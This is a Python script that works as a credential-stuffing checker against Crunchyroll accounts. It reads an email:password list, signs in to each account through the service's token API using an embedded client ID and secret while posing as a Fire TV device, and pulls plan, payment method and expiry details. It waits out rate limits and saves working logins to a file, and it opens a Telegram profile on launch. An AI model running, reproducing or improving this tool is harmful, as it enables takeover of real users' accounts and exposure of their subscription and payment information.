import requests
import random
import time
from uuid import uuid1
import webbrowser

# Automatically open Telegram profile
def open_telegram():
    telegram_link = "tg://resolve?domain=Hooder254"  # Replace with your username
       
    print("Opening your Telegram profile...")
    webbrowser.open(telegram_link)  # Open the link in the default browser
    time.sleep(3)  # Wait for 3 seconds before proceeding

# Call the function at the start of the script
open_telegram()

G = '\033[2;32m'  # Green for success messages
R = '\033[1;31m'  # Red for failure messages
O = '\x1b[38;5;208m'  # Orange for other messages

def login(email, pasw):
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara"
    }
    
    res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers)
    
    if "refresh_token" in res.text:
        token = res.text.split('access_token":"')[1].split('"')[0]
        headers_get = {
            "Authorization": f"Bearer {token}",
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "User-Agent": "Ktor client",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        
        res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get)
        
        if "external_id" in res_get.text:
            external_id = res_get.text.split('external_id":"')[1].split('"')[0]
            headers_info = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": "Ktor client",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            res_info = requests.get(f"https://beta-api.crunchyroll.com//subs/v1/subscriptions/{external_id}/third_party_products", headers=headers_info)
            
            if "fan" in res_info.text or "premium" in res_info.text or "no_ads" in res_info.text or 'is_subscribable":false' in res_info.text:
                try:
                    plan_type = res_info.text.split('"type":"')[1].split('"')[0]
                    free_trial = res_info.text.split('"active_free_trial":')[1].split(",")[0]		
                    payment = res_info.text.split('"source":"')[1].split('"')[0]
                    expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
                    
                    msg = f"""
┏━━━━━━━⍟
┃{email}
┗━━━━━━━━━━━⊛
┏━━━━⍟
┃{pasw}
┗━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃Plan ⥤ {plan_type}
┃Free Trial => {free_trial}
┃Payment Method ⥤ {payment}
┃Expiration Date ⥤ {expiry}
┗━━━━━━━━━━━⊛
"""
                    print(f' {G}{msg}')
                    return f'{G}{email}:{pasw} ⥤ [SUCCESS] ✅'
                except:
                    return f' {G}{email}:{pasw} ⥤ [SUCCESS] ✅'
            else:
                return f'{O}{email}:{pasw} ⥤ [SPECIAL]'
        else:
            return f' {R}{email}:{pasw} ⥤ [INVALID] ❌'
    elif '406 Not Acceptable' in res.text:
        print(" — Please wait for 5+ minutes ")
        time.sleep(420)
        return f' {R}{email}:{pasw} ⥤ [INVALID] ❌'
    else:
        return f' {R}{email}:{pasw} ⥤ [INVALID] ❌'

##############################

# File names
successful_file = 'successful_accounts.txt'
failed_file = 'failed_accounts.txt'

# Password check
password = "lemyley"
user_password = input(f"{O}— Please enter the password => ")

if user_password != password:
    print(f"{R}Incorrect password! Terminating program...{R}")
else:
    file_name = input(f" {O}— File PATH => ")
    file = open(file_name).read().splitlines()
    print(f"[yellow]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    # Write successes and failures to files
    with open(successful_file, 'a') as success_f, open(failed_file, 'a') as failed_f:
        for line in file:
            try:
                email, pasw = line.strip().split(':')
                result = login(email, pasw)
                print(result)
                if "SUCCESS" in result:
                    success_f.write(result + '\n')
                elif "INVALID" in result:
                    failed_f.write(result + '\n')
            except ValueError:
                print(f"{R}Invalid format: {line} {R}⥤ [ERROR]")
            except Exception as e:
                print(f"{R}Error processing {line}: {e} {R}⥤ [ERROR]")